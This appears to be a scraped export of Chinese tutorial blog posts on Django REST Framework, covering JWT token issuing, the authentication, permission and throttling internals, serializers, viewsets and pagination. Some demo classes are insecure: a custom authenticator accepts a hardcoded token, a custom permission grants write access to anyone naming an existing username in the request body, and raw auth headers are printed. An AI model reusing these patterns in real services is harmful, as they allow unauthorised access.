api_settings.JWT_EXPIRATION_DELTA) response.set_cookie(api_settings.JWT_AUTH_COOKIE, token, expires=expiration, httponly=True) return response return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST) serializer钩子函数 JSONWebTokenAPIView并没有实现token签发的逻辑，而是在子类ObtainJSONWebToken的序列化器中的全局钩子中来处理了token的签发 JSONWebTokenSerializer中的validate函数完成了token的签发 12345678910111213141516171819202122232425262728293031# token签发的核心逻辑 def validate(self, attrs): credentials = &#123; self.username_field: attrs.get(self.username_field), &#x27;password&#x27;: attrs.get(&#x27;password&#x27;) &#125; if all(credentials.values()): # 对当前用户进行认证 返回一个user user = authenticate(**credentials) if user: if not user.is_active: msg = _(&#x27;User account is disabled.&#x27;) raise serializers.ValidationError(msg) # 满足所有条件的用户 根据用户的信息生成载荷 payload = jwt_payload_handler(user) return &#123; # 根据载荷生成对应的token &#x27;token&#x27;: jwt_encode_handler(payload), &#x27;user&#x27;: user &#125; else: msg = _(&#x27;Unable to log in with provided credentials.&#x27;) raise serializers.ValidationError(msg) else: msg = _(&#x27;Must include &quot;&#123;username_field&#125;&quot; and &quot;password&quot;.&#x27;) msg = msg.format(username_field=self.username_field) raise serializers.ValidationError(msg) 生成token的方式 12345678910111. 通过username password获取到用户对象，对user进行校验2. 通过user对象来生成载荷：`jwt_payload_handler(user)` &#x27;rest_framework_jwt.utils.jwt_payload_handler&#x27;, 3. 通过载荷payload来签发token： `jwt_encode_handler(payload)` &#x27;rest_framework_jwt.utils.jwt_payload_handler&#x27;, # 总结： 1. 签发token走的是`ObtainJSONWebToken`父类中的post方法 2. user 与 token是在ObtainJSONWebToken自己的序列化器中的全局钩子中来完成获取的 3. 多方式登陆 签发token签发token1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import refrom rest_framework.serializers import ModelSerializerfrom rest_framework import serializersfrom rest_framework_jwt.settings import api_settingsfrom api.models import Userjwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLERjwt_encode_handler = api_settings.JWT_ENCODE_HANDLERclass UserModelSerializer(ModelSerializer): &quot;&quot;&quot; 前端发送请求 传递参数 但数据不需要保存至数据 反序列化的过程中，有些字段只参与反序列化的业务，并不会保存到数据中，模型也没有对应的字段 &quot;&quot;&quot; # 自定义反序列化字段 代表这个字段只参与反序列化 且不会要求这个字段与model类进行映射 account = serializers.CharField(write_only=True) password = serializers.CharField(write_only=True) class Meta: model = User fields = [&quot;account&quot;, &quot;password&quot;, &quot;username&quot;, &quot;phone&quot;, &quot;email&quot;] extra_kwargs = &#123; &quot;username&quot;: &#123; &quot;read_only&quot;: True &#125;, &quot;phone&quot;: &#123; &quot;read_only&quot;: True &#125;, &quot;email&quot;: &#123; &quot;read_only&quot;: True &#125;, &#125; def validate(self, attrs): account = attrs.get(&quot;account&quot;) password = attrs.get(&quot;password&quot;) # 对各种登陆方式做处理 账号 邮箱 手机号 if re.match(r&#x27;1[3-9][0-9]&#123;9&#125;&#x27;, account): user_obj = User.objects.filter(phone=account).first() elif re.match(r&#x27;.+@.+&#x27;, account): user_obj = User.objects.filter(email=account).first() else: user_obj = User.objects.filter(username=account).first() # 判断用户是否存在 if user_obj and user_obj.check_password(password): # 签发token &quot;&quot;&quot; 根据用户信息生成载荷 根据载荷生成token &quot;&quot;&quot; payload = jwt_payload_handler(user_obj) token = jwt_encode_handler(payload) self.obj = user_obj self.token = token return attrs 自定义校验token 继承BaseJSONWebTokenAuthentication，重写authenticate方法 12345678910111213141516171819202122232425262728293031323334353637import jwtfrom rest_framework import exceptionsfrom rest_framework_jwt.authentication import BaseJSONWebTokenAuthentication, jwt_decode_handlerclass JWTAuthentication(BaseJSONWebTokenAuthentication): def authenticate(self, request): # 获取前端传递的token jwt_token = request.META.get(&quot;HTTP_AUTHORIZATION&quot;, None) print(jwt_token) # 自定义对于token的校验规则 token = self.parse_jwt_token(jwt_token) if token is None: return None # 将通过token反解析出载荷 try: payload = jwt_decode_handler(token) except jwt.ExpiredSignature: raise exceptions.AuthenticationFailed(&quot;签名已过期&quot;) except: raise exceptions.AuthenticationFailed(&#x27;非法用户&#x27;) # 如果没有任何错误 则代表解析通过 user = self.authenticate_credentials(payload) return user, token def parse_jwt_token(self, jwt_token): tokens = jwt_token.split() if len(tokens) != 3 or tokens[0].lower() != &quot;auth&quot; or tokens[2].lower() != &quot;jwt&quot;: return None return tokens[1] 4. 搜索与排序组件12345678910class ComputerListAPIView(ListAPIView): queryset = Computer.objects.all() serializer_class = ComputerModelSerializer # 通过filter_backends来配置你要使用的过滤器类 filter_backends = [SearchFilter, OrderingFilter] # 指定你要搜索的字段|条件 search_fields = [&#x27;name&#x27;, &quot;price&quot;] # 指定排序的条件 ordering = [&#x27;price&#x27;] 5. 分页组件基础分页器123456789class MyPageNumberPagination(PageNumberPagination): # 指定每页分页的数量 page_size = 2 # 指定每页分页的最大数量 max_page_size = 5 # 指定前端修改每页分页数量的key page_size_query_param = &quot;page_size&quot; # 手机指定获取第几页的对象 page_query_param = &quot;page&quot; 偏移分页器123456789class MyLimitOffsetPagination(LimitOffsetPagination): # 默认获取每页的数量 default_limit = 3 # 指定前端获取每页数量的key limit_query_param = &quot;limit&quot; # 指定偏移开始的位置 offset_query_param = &quot;offset&quot; # 指定每页获取的最大数量 max_limit = 5 游标分页器（了解）123456class MyCursorPagination(CursorPagination): cursor_query_param = &quot;course&quot; page_size = 3 page_size_query_param = &quot;page_size&quot; max_page_size = 5 ordering = &quot;-price&quot; django-filter pip install django-filter&#x3D;&#x3D;2.2.0 filter.py 12345678910111213from django_filters.rest_framework import FilterSetfrom api.models import Computerclass ComputerFilterSet(FilterSet): from django_filters import filters min_price = filters.NumberFilter(field_name=&quot;price&quot;, lookup_expr=&quot;gte&quot;) max_price = filters.NumberFilter(field_name=&quot;price&quot;, lookup_expr=&quot;lte&quot;) class Meta: model = Computer fields = [&quot;brand&quot;, &quot;min_price&quot;, &quot;max_price&quot;] views.py 1234567891011121314class ComputerListAPIView(ListAPIView): queryset = Computer.objects.all() serializer_class = ComputerModelSerializer # 通过filter_backends来配置你要使用的过滤器类 filter_backends = [SearchFilter, OrderingFilter, DjangoFilterBackend] # 指定你要搜索的字段|条件 search_fields = [&#x27;name&#x27;, &quot;price&quot;] # 指定排序的条件 ordering = [&#x27;price&#x27;] # 查询价格大于 3000 小于8000的电脑 # django-filter查询 通过filter_class 指定过滤器 filter_class = ComputerFilterSet 作业1231. 掌握JWT签发与校验token的方式，多方式签发token2. 掌握过滤组件以及django-filter插件的使用3. 总结知识图谱","categories":[],"tags":[]},{"title":"","slug":"drf-day5","date":"2024-10-24T11:20:58.357Z","updated":"2024-10-07T05:21:30.860Z","comments":true,"path":"2024/10/24/drf-day5/","permalink":"http://example.com/2024/10/24/drf-day5/","excerpt":"","text":"DRF–day51. DRF三大认证组件认证组件 认证入口：self.perform_authentication(request) 作用：主要是用来校验当前访问者的身份信息 游客 合法用户 非法用户 游客：代表校验通过，直接进入下一步校验 合法用户：校验通过，可以进入下一步校验 非法用户：校验失败，抛出异常。返回非法用户 权限组件 权限入口：self.check_permissions(request) 作用：检查用户所拥有的权限，某些操作必须登录才能访问，所有用户、登录可写，游客只读、自定义角色 认证通过：可以进入到下一步 频率 认证失败：直接抛出异常 返回403权限异常 频率组件 频率入口：self.check_throttles(request) 作用：限制请求在规定时间内访问某个接口的次数 没有达到：可以正常访问 达到限次：限制时间内禁止访问该接口，限制时间超过后，可以正常访问 Django的权限设计 自定义权限表1234567891011121314151617from django.db import modelsfrom django.contrib.auth.models import AbstractUserclass User(AbstractUser): phone = models.CharField(max_length=11, unique=True) class Meta: db_table = &quot;api_user&quot; verbose_name = &quot;用户&quot; verbose_name_plural = verbose_name def __str__(self): return self.username# 配置django默认的用户表 “app名字.模型名”AUTH_USER_MODEL = &quot;api.User&quot; 12345# 自定义用户表后迁移出现问题 解决办法如下1. 删除django.contrib下的admin、auth中的迁移记录 app中的迁移记录2. 卸载django重装3. 删除原有的sqllite文件4. 重新执行迁移命令 2. 认证模块 认证请求的身份 12345# 权限认证流程1. 认证方法的入口：`self.perform_authentication(request)`,开始执行认证相关的功能，返回用户信息2. 在request类中的`user`方法属性保存了访问的用户信息，在`user`方法中调用了`self._authenticate()`来认证用户的信息3. 在`def _authenticate(self):`内部调用认证器类来完成了用户信息的认证4. 遍历drf配置的一个个认证器对象，并调用认证器对象的`authenticate(self)`方法来对用户信息进行解析 认证类源码1234567891011121314151617181920212223def _authenticate(self): &quot;&quot;&quot; Attempt to authenticate the request using each authentication instance in turn. &quot;&quot;&quot; # 遍历认证器 获取到每一个认证器进行认证 self.authenticators:认证器对象 for authenticator in self.authenticators: try: # 认证类方法包含两个参数： self是request对象 认证器本身 user_auth_tuple = authenticator.authenticate(self) except exceptions.APIException: self._not_authenticated() raise # 对于认证后的返回值的处理：如果有返回值 就将认证出的用户信息分别保存到self.request self.auth if user_auth_tuple is not None: self._authenticator = authenticator # reques.user request.auth self.user, self.auth = user_auth_tuple return # 如果认证器认证出的信息为 None self._not_authenticated() SessionAuthentication1234567891011121314151617181920212223242526class SessionAuthentication(BaseAuthentication): &quot;&quot;&quot; Use Django&#x27;s session framework for authentication. &quot;&quot;&quot; def authenticate(self, request): &quot;&quot;&quot; Returns a `User` if the request session currently has a logged in user. Otherwise returns `None`. &quot;&quot;&quot; # Get the session-based user from the underlying HttpRequest object # 从当前请求中解析出用户 如果用户不存在为None user = getattr(request._request, &#x27;user&#x27;, None) # Unauthenticated, CSRF validation not required if not user or not user.is_active: # 如果用户不存在 或者用户状态不满足 返回None return None # 解析出用户后 基于session的认证要重新启动csrf认证 # 如果csrf认证失败 出现异常 返回非法用户 self.enforce_csrf(request) # CSRF passed with authenticated user return (user, None) BasicAuthentication1234567891011121314151617181920212223242526272829303132333435class BasicAuthentication(BaseAuthentication): &quot;&quot;&quot; HTTP Basic authentication against username/password. &quot;&quot;&quot; www_authenticate_realm = &#x27;api&#x27; def authenticate(self, request): &quot;&quot;&quot; Returns a `User` if a correct username and password have been supplied using HTTP Basic authentication. Otherwise returns `None`. &quot;&quot;&quot; # 解析出的 认证信息 该认证信息是两段式 &quot;basic 认证字符串&quot; auth = get_authorization_header(request).split() if not auth or auth[0].lower() != b&#x27;basic&#x27;: return None # 如果认证信息存在但格式不对 则抛出异常 if len(auth) == 1: msg = _(&#x27;Invalid basic header. No credentials provided.&#x27;) raise exceptions.AuthenticationFailed(msg) elif len(auth) &gt; 2: msg = _(&#x27;Invalid basic header. Credentials string should not contain spaces.&#x27;) raise exceptions.AuthenticationFailed(msg) try: auth_parts = base64.b64decode(auth[1]).decode(HTTP_HEADER_ENCODING).partition(&#x27;:&#x27;) except (TypeError, UnicodeDecodeError, binascii.Error): msg = _(&#x27;Invalid basic header. Credentials not correctly base64 encoded.&#x27;) raise exceptions.AuthenticationFailed(msg) # 从认证信息中解析出用户id 密码 进一步得到用户对象 userid, password = auth_parts[0], auth_parts[2] # return (user, None) return self.authenticate_credentials(userid, password, request) 自定义认证类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from rest_framework import exceptionsfrom rest_framework.authentication import BaseAuthenticationfrom api.models import User&quot;&quot;&quot;1. 继承BaseAuthentication类2. 重写authenticate方法3. 自定义认证规则 没有认证信息返回None (游客) 有认证信息但不符合要求 (非法) 有认证信息且认证成功 返回认证用户与信息 返回的格式一定是元祖 (合法用户)&quot;&quot;&quot;class MyAuth(BaseAuthentication): &quot;&quot;&quot; 前端发送请求必须携带 认证信息 需要按照一定的格式来 默认使用Authorization来携带认证信息 认证信息都包含在 request.META中 &quot;&quot;&quot; def authenticate(self, request): # 获取认证信息 auth = request.META.get(&#x27;HTTP_AUTHORIZATION&#x27;, None) print(auth) if auth is None: # 代表游客 return None # 设置认证信息的校验规则 &quot;auth 认证信息&quot; auth_split = auth.split() # 校验规则 if not (len(auth_split) == 2 and auth_split[0].lower() == &quot;auth&quot;): raise exceptions.AuthenticationFailed(&quot;认证信息有误，认证失败&quot;) # 如果认证成功，开始解析用户 规定用户信息必须是 abc.admin.123 if auth_split[1] != &quot;abc.admin1.123&quot;: raise exceptions.AuthenticationFailed(&quot;用户信息认证失败&quot;) # 校验数据库是否存在此用户 user = User.objects.filter(username=&quot;admin1&quot;).first() if not user: raise exceptions.AuthenticationFailed(&quot;用户不存在或者已删除&quot;) return user, None 3. 权限组件 入口：self.check_permissions(request) 源码剖析123456789101112131415# 权限组件的核心方法def check_permissions(self, request): &quot;&quot;&quot; Check if the request should be permitted. Raises an appropriate exception if the request is not permitted. &quot;&quot;&quot; # 遍历权限类获取到一个个的权限对象 进行权限认证 for permission in self.get_permissions(): # 参数：权限对象self 请求对象request # 如果有权限则返回True 如果没有权限则返回False # 通过权限类的has_permission()方法完成的权限的认证 if not permission.has_permission(request, self): self.permission_denied( request, message=getattr(permission, &#x27;message&#x27;, None) ) 系统的权限类1234567891. AllowAny 允许任何人任何请求访问2. IsAuthenticated 只允许认证成功的用户访问 非法用户以及游客无权访问 3. IsAdminUser 只允许超级管理员访问 游客 普通用户无法访问4. IsAuthenticatedOrReadOnly 认证规则： 已经认证成功的用户可以正常操作 游客只读 使用方式12345678910111213141516171819# 全局配置REST_FRAMEWORK = &#123; # DRF默认的权限认证类 &#x27;DEFAULT_AUTHENTICATION_CLASSES&#x27;: [ # 默认的认证器 &#x27;rest_framework.authentication.SessionAuthentication&#x27;, # 基于session &#x27;rest_framework.authentication.BasicAuthentication&#x27;, # Basic # &#x27;api.authentications.MyAuth&#x27;, ], # DRF默认的权限配置 &#x27;DEFAULT_PERMISSION_CLASSES&#x27;: [ &#x27;rest_framework.permissions.AllowAny&#x27;, ],&#125;# 局部配置class UserAPIView(APIView): authentication_classes = [MyAuth] # 权限组件的功能依赖于认证组件 否则无法工作 permission_classes = [IsAuthenticatedOrReadOnly] 自定义权限12345678910111213141516171819202122from rest_framework.permissions import BasePermissionfrom api.models import Userclass MyPermission(BasePermission): &quot;&quot;&quot; 登陆可写 游客只读、 有权限返回True 无权限返回False &quot;&quot;&quot; def has_permission(self, request, view): # 如果是只读 则所有人都可以访问 if request.method in (&quot;GET&quot;, &quot;HEAD&quot;, &quot;OPTIONS&quot;): return True username = request.data.get(&quot;username&quot;) # 如果用户访问的是写操作 判断用户是否有登陆信息 user = User.objects.filter(username=username).first() print(user) if user: return True return False 4. 频率组件 入口：self.check_throttles(request) 频率组件源码123456789101112131415161718192021def check_throttles(self, request): &quot;&quot;&quot; Check if request should be throttled. Raises an appropriate exception if the request is throttled. &quot;&quot;&quot; # 1.遍历配置的频率认证类，初始化得到一个个的频率类对象 会调用的认证类的__init__方法 # 2.调用频率认证类的allow_request(request, self)方法来判断当前请求是否被限次（x限次不能访问） # 3.频率认证类会在限次后返回Flase，调用wait()方法，返回下一次可以访问此接口的剩余时间 # 注意：所有的认证类都继承了SimpleRateThrottle throttle_durations = [] # 遍历频率类获取到一个个的频率类对象来进行请求的限制 for throttle in self.get_throttles(): # 调用认证类的allow_request来进行请求的限次 限次了返回False if not throttle.allow_request(request, self): # 一旦当前请求被限次了 返回False 调用了wait() 返回下一次可以访问此接口的剩余时间 throttle_durations.append(throttle.wait()) if throttle_durations: self.throttled(request, max(throttle_durations)) 1234567891011121314151617181920212223242526272829303132333435def allow_request(self, request, view): &quot;&quot;&quot; Implement the check to see if the request should be throttled. On success calls `throttle_success`. On failure calls `throttle_failure`. &quot;&quot;&quot; if self.rate is None: return True # get_cache_key获取当前用户的唯一标识 并存在缓存中 # throttle_18500001111_1 self.key = self.get_cache_key(request, view) if self.key is None: return True # 获取当前self.key的访问信息 # 如果self.key是初次访问 self.history 为空[] # self.history每次访问的时间 [16:21:56, 16:21:57, 16:21:58] self.history = self.cache.get(self.key, []) # 获取当前时间 self.now = self.timer() # Drop any requests from the history which have now passed the # throttle duration # 判断当前事件减去单位时间 是不是大于最后一次访问时间 # 满足条件 则清除 不再累加 while self.history and self.history[-1] &lt;= self.now - self.duration: self.history.pop() # 如果self.history大于 self.num_requests访问次数，则直接不允许访问 if len(self.history) &gt;= self.num_requests: # return False 不允许访问 return self.throttle_failure() return self.throttle_success() 使用方式1234567891011121314151617# 全局配置REST_FRAMEWORK = &#123; ...... # DRF频率配置 &#x27;DEFAULT_THROTTLE_CLASSES&#x27;: [ # &#x27;rest_framework.throttling.UserRateThrottle&#x27;, &#x27;api.throttle.SendMessageRate&#x27;, ], &#x27;DEFAULT_THROTTLE_RATES&#x27;: &#123; &#x27;anon&#x27;: &#x27;3/m&#x27;, &#x27;user&#x27;: &#x27;10/day&#x27;, &#x27;send&#x27;: &#x27;1/m&#x27;, &#125;&#125;# 局部配置throttle_classes = [SendMessageRate] 自定义频率类12345678910111213141516from rest_framework.throttling import SimpleRateThrottleclass SendMessageRate(SimpleRateThrottle): scope = &quot;anon&quot; # 只对包含手机号的请求做验证 def get_cache_key(self, request, view): phone = request.query_params.get(&quot;phone&quot;) if not phone: return None # 返回数据 根据手机号动态展示返回的值 return phone 作业1231. 掌握RBAC设计思想2. 理解三大认证模块源码3. 掌握三大认证模块自定义以及使用方式","categories":[],"tags":[]},{"title":"","slug":"drf-day4","date":"2024-10-24T11:20:58.356Z","updated":"2024-10-07T05:21:30.915Z","comments":true,"path":"2024/10/24/drf-day4/","permalink":"http://example.com/2024/10/24/drf-day4/","excerpt":"","text":"drf-day41. 群体修改局部修改 DRF默认没有提供修改多个对象的方法,需要自己通过ListSerializer来重写update方法来实现修改多个对象的逻辑 ListSerializer使用方式 1234567891011121314151617181920212223242526class BookListSerializer(serializers.ListSerializer): &quot;&quot;&quot; 使用此序列化器完成更新多个对象 &quot;&quot;&quot; # 重写update方法完成更新 def update(self, instance, validated_data): print(instance) # 要修改的实例 print(validated_data) # 要修改的实例的值 # TODO 将修改多个 改变成循环中每次修改一个 for index, obj in enumerate(instance): # 每遍历一次 就修改一个对象的数据 self.child.update(obj, validated_data[index]) return instance class BookModelSerializerV2(serializers.ModelSerializer): class Meta: model = Book # fields应该写哪些字段 应该填写序列化与反序列化所需字段的并集 fields = (&quot;book_name&quot;, &quot;price&quot;, &quot;publish&quot;, &quot;authors&quot;, &quot;pic&quot;) # 指定修改多个的序列化器 list_serializer_class = BookListSerializer 12345# 总结1. 前端参数按照一定的格式来传递,在视图中处理前端传递的参数2. 校验前端传递的参数,将参数对应的实例查询出来并存放3. 将要修改的实例以及实例对应的要更新的值传递到序列化器4. DRF默认没有提供同时修改多个对象的方法,需要自己继承`ListSerializer`并重写`update()`来完成更新 2. DRF视图Generics与mixins DRF中有四大视图组件: views、generics、mixins、viewset views: DRF原生的视图模块，提供最基本的视图访问方式 mixins： 五大工具类，分别提供不同的操作方式 generics： 方法视图，提供内置操作对象以及序列化器的方法 viewset： 视图集 generics.GenericAPIView generics.GenericAPIView：主要作用是提供了三个方法，分别是： get_queryset：可以通过在类视图指定的queryset属性来获取指定模型的所有数据 get_serializer： 通过当前类视图指定的serializer_class属性来获取当前视图要使用的序列化器 get_object： 获取要操作的单个对象，通过url指定的参数来查询要操作的单个对象 lookup_field：来指定url参数的名称 mixins五大工具视图 mixins提供了多种查询API，需要与generics.GenericAPIView共同继承使用 CreateModelMixin： 创建单个对象 ListModelMixin： 查询所有 RetrieveModelMixin：查询单个 UpdateModelMixin：更新单个 DestroyModelMixin：删除单个 1234567891011121314151617181920212223242526272829# GenericAPIView继承APIView 两者是完全兼容的# 重点分析GenericAPIView在APIView基础上完成了哪些事情class BookGenericAPIView(GenericAPIView, mixins.ListModelMixin, mixins.RetrieveModelMixin, mixins.DestroyModelMixin, mixins.CreateModelMixin, mixins.UpdateModelMixin): # 获取当前视图要操作的模型数据 queryset = Book.objects.filter() # 获取当前视图要使用的序列化器 serializer_class = BookModelSerializerV3 lookup_field = &quot;id&quot; def get(self, request, *args, **kwargs): if &quot;id&quot; in kwargs: return self.retrieve(request, *args, **kwargs) return self.list(request, *args, **kwargs) def delete(self, request, *args, **kwargs): return self.destroy(request, *args, **kwargs) def post(self, request, *args, **kwargs): return self.create(request, *args, **kwargs) def put(self, request, *args, **kwargs): return self.partial_update(request, *args, **kwargs) generics工具视图 1、generics工具视图同时继承GenericAPIView与mixins模块下的各个工具类，所以继承了不同类的视图就拥有对应的操作方法 2、工具类视图为你混合好了各种常见的API操作，只需要继承各种工具类视图，提供queryset与serializer_class即可完成对应的操作 3、如果都是查询操作，则无法同时实现查询单个与查询多个 3. DRF视图 viewsets 主要目的：当执行的不是标准的http行为，让开发者可以将http请求映射到自定义的方法函数中 视图集的核心：ViewSetMixin ，继承此类就拥有了自定义视图以及路由映射的能力 ViewSet继承的是APIView与ViewSetMixin ，没有提供任何默认的方法，所有的逻辑都需要自己实现 GenericViewSet继承了GenericAPIView与ViewSetMixin，提供了与mixins混合使用的三个方法，只需要继承对应的mixins工具类即可使用对应的方法 ModelViewSet： 继承了GenericViewSet与所有的mixins工具类 路由定义12path(&quot;set/&quot;, views.BookViewSetView.as_view(&#123;&quot;post&quot;: &quot;user_login&quot;, &quot;get&quot;: &quot;get_user_count&quot;&#125;)), path(&quot;set/&lt;str:id&gt;/&quot;, views.BookViewSetView.as_view(&#123;&quot;post&quot;: &quot;user_login&quot;, &quot;get&quot;: &quot;get_user_count&quot;&#125;)), 视图开发123456789101112131415class BookViewSetView(viewsets.GenericViewSet, mixins.ListModelMixin): queryset = Book.objects.all() serializer_class = BookModelSerializerV3 def user_login(self, request, *args, **kwargs): # 可以在此完成登录的逻辑 request_data = request.data print(&quot;登录成功&quot;) return Response(&quot;登录成功&quot;) def get_user_count(self, request, *args, **kwargs): # 完成获取用户数量的逻辑 print(&quot;查询成功&quot;) return self.list(request, *args, **kwargs) 4. DRF视图的继承关系 作业123451. 掌握ListSerializer的使用方式2. 掌握generics与mixins视图的使用方式3. 掌握视图集viewset的开发方式 注册接口 登陆接口4. 梳理DRF视图的继承关系","categories":[],"tags":[]},{"title":"","slug":"drf-day3","date":"2024-10-24T11:20:58.354Z","updated":"2024-10-07T05:21:30.801Z","comments":true,"path":"2024/10/24/drf-day3/","permalink":"http://example.com/2024/10/24/drf-day3/","excerpt":"","text":"drf-day31. 知识回顾补充回顾123456789101. request: 获取请求中所包含的参数2. render: 决定了数据以何种的形式返回到前端3. parser: 指定了视图可以接受前端传递什么类型的参数4. 异常的处理: 解析了drf的异常时如何进行处理的5. Response: 指定了响应请求的状态码6. 序列化器: 将从数据库中查询的数据转换成json字符串来响应到前台 序列化: 自定义属性: SerializerMethodField自定义字段 反序列化: 将从前端获取的数据保存至数据库 对前端提交的数据进行安全校验 在保存对象时重写`create()`方法来完成对象的保存 钩子函数 在使用create()方法去保存数据之前,可使用DRF提供的全局钩子以及局部钩子对数据进行自定义校验 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556class EmployeeDeSerializer(serializers.Serializer): &quot;&quot;&quot; 反序列化: 将前端提交的数据保存到数据库 1. 需要前端提供哪些字段 2. 对字段进行安全校验 3. 有没有字段需要额外的校验 反序列化不需要自定义字段 &quot;&quot;&quot; # 添加校验规则 username = serializers.CharField( max_length=3, min_length=2, error_messages=&#123; &quot;max_length&quot;: &quot;长度太长了&quot;, &quot;min_length&quot;: &quot;长度太短了&quot;, &#125; ) password = serializers.CharField() phone = serializers.CharField() re_pwd = serializers.CharField() # TODO 钩子函数 在create方法执行之前,DRF提供了两个钩子函数来对数据进行校验 # 全局钩子 获取所有需要序列化的字段 def validate(self, attrs): # 验证两次密码是否一致 pwd = attrs.get(&quot;password&quot;) re_pwd = attrs.pop(&quot;re_pwd&quot;) # 自定义规则 两次密码不一致则不能创建员工 if pwd != re_pwd: raise exceptions.ValidationError(&quot;两次密码不一致&quot;) return attrs # 局部钩子 对某一个字段进行验证 def validate_username(self, value): # 自定义用户名的校验规则 if &quot;1&quot; in value: raise exceptions.ValidationError(&quot;用户名有误&quot;) # 如果用户名存在 则不能保存 emp = Employee.objects.filter(username=value) if emp: raise exceptions.ValidationError(&quot;用户名已存在&quot;) return value # 如果想要完成对象的新增 必须重写create方法 # self是序列化器对象 validated_data需要保存的数据 def create(self, validated_data): # print(validated_data.get(&quot;phone&quot;)) return Employee.objects.create(**validated_data) 2. 模型设计表设计 抽象表(基表) 可以把多张表共有的字段抽取出来作为基表, 12345678910class BaseModel(models.Model): is_delete = models.BooleanField(max_length=128) create_time = models.DateTimeField(auto_now_add=True) status = models.BooleanField(default=True) class Meta: # 原元数据中声明此字段后 不会再数据库为此表创建对应的表结构 # 其他模型在继承此模型后,可以继承表中的字段 abstract = True 3. 序列化器之ModelSerializerModelSerializer使用方式12345678910111213141516class BookModelSerializer(serializers.ModelSerializer): class Meta: # 指定当前序列化器类要序列化的模型 model = Book # 指定我要序列化的字段 # fields = (&quot;book_name&quot;, &quot;price&quot;, &quot;pic&quot;) # 可以直接序列化所有字段 # fields = &quot;__all__&quot; # 指定不展示哪些字段 exclude = (&quot;is_delete&quot;, &quot;status&quot;, &quot;create_time&quot;) # 指定查询的深度 # depth = 1 ModelSerializer自定义字段 在序列化器要序列化的模型中提供类方法作为序列化器的自定义属性来展示 12345678910111213141516171819202122232425262728class Book(BaseModel): book_name = models.CharField(max_length=128) price = models.DecimalField(max_digits=6, decimal_places=2) pic = models.ImageField(upload_to=&quot;img&quot;, default=&quot;img/1.jpg&quot;) publish = models.ForeignKey(to=&quot;Press&quot;, on_delete=models.CASCADE, db_constraint=False, related_name=&quot;books&quot;) authors = models.ManyToManyField(to=&quot;Author&quot;, db_constraint=False, related_name=&quot;books&quot;) class Meta: db_table = &quot;bz_book&quot; verbose_name = &quot;图书&quot; verbose_name_plural = verbose_name def __str__(self): return self.book_name # @property # def aaa(self): # return &quot;aaa&quot; # 自定义序列化属性 @property def press_name(self): return self.publish.press_name @property def author_list(self): return self.authors.values(&quot;author_name&quot;, &quot;age&quot;, &quot;detail__phone&quot;) 序列化多表查询 序列化器嵌套夺表查询时, 必须指定的外键的名称,且需要早fields中使用它 如果嵌套的序列化器不是外键,则无法完成查询 123456789101112131415161718192021222324class PressModelSerializer(serializers.ModelSerializer): class Meta: model = Press fields = (&quot;press_name&quot;, &quot;pic&quot;, &quot;address&quot;)class BookModelSerializer(serializers.ModelSerializer): # 不推荐使用这种自定义的方式 # aaa = serializers.SerializerMethodField() # # def get_aaa(self, obj): # return &quot;aaa&quot; # TODO 自定义连表查询 查询图书时可以将图书对应的出版社的信息查询出来 # 在一个序列化器内可以嵌套另外一个序列化器类来完成多表查询 # 序列化器对应的字段必须是当前模型类中的外键 publish = PressModelSerializer() class Meta: # 指定当前序列化器类要序列化的模型 model = Book # 指定我要序列化的字段 fields = (&quot;book_name&quot;, &quot;price&quot;, &quot;pic&quot;, &quot;publish&quot;) 4. ModelSerializer反序列化反序列化器的定义 ModelSerializer内部自己实现了create()方法去保存对象, 无需开发者自己重写 extra_kwargs: 可以通过此参数为反序列化器添加校验规则 全局钩子与局部钩子同样可以自定义校验规则 fields中所标注的字段必须提供对应的值 123456789101112131415161718192021222324252627class BookDeModelSerializer(serializers.ModelSerializer): &quot;&quot;&quot;反序列化器&quot;&quot;&quot; class Meta: model = Book fields = (&quot;book_name&quot;, &quot;price&quot;, &quot;publish&quot;, &quot;authors&quot;) # 添加DRF提供的默认校验规则 extra_kwargs = &#123; &quot;book_name&quot;: &#123; &quot;required&quot;: True, # 必填字段 &quot;min_length&quot;: 2, # 最小长度 &quot;error_messages&quot;: &#123; &quot;required&quot;: &quot;图书名必须提供&quot;, &quot;min_length&quot;: &quot;图书名不能少于两个字符&quot;, &#125; &#125;, &quot;price&quot;: &#123;&#125;, &#125; def validate(self, attrs): print(attrs) return attrs def validate_book_name(self, obj): print(obj) return obj 序列化器与反序列化器整合 fields需要填写参与序列化与反序列化的字段的并集 在extra_kwargs中可以通过read_only与write_only来指定字段只参与序列化或者只参与反序列化 全局钩子与局部钩子仍然可以正常使用 1234567891011121314151617181920212223242526272829303132333435class BookModelSerializerV2(serializers.ModelSerializer): class Meta: model = Book # fields应该写哪些字段 应该填写序列化与反序列化所需字段的并集 fields = (&quot;book_name&quot;, &quot;price&quot;, &quot;publish&quot;, &quot;authors&quot;, &quot;pic&quot;) extra_kwargs = &#123; &quot;book_name&quot;: &#123; &quot;required&quot;: True, # 必填字段 &quot;min_length&quot;: 2, # 最小长度 &quot;error_messages&quot;: &#123; &quot;required&quot;: &quot;图书名必须提供&quot;, &quot;min_length&quot;: &quot;图书名不能少于两个字符&quot;, &#125; &#125;, # 指定某个字段只参与序列化 &quot;pic&quot;: &#123; &quot;read_only&quot;: True &#125;, # 指定某个字段只参与反序列化 &quot;publish&quot;: &#123; &quot;write_only&quot;: True &#125;, &quot;authors&quot;: &#123; &quot;write_only&quot;: True &#125;, &#125; def validate(self, attrs): print(attrs) return attrs def validate_book_name(self, obj): print(obj) return obj 5. 接口API更新单个对象整体 修改对象时,在调用序列化器验证数据时必须指定instance关键字在调用serializer.save() 底层是通过ModelSerializer内部的update()方法来完成的更新 可以在序列化器通过重写update()方法来完成自定义更新 更新单个对象局部 更新单个局部只需要指定参数partial=True即可 6. ModelSerializer与Serializer ModelSerializer在Serializer的基础上定制了更多的功能 在序列化ModelSerializer内部自己实现了create()方法与update()方法,在更新以及新增对象时无需自己实现逻辑 序列化器数据的校验方式以及字段的自定义方式有所不同 作业123456781. 掌握全局钩子与局部钩子的使用方式 ModelSerializer 2. 掌握常见接口的开发 查询单个 查询所有 删除单个 删除所有 新增单个 新增所有 局部修改单个 整个修改单个3. Django 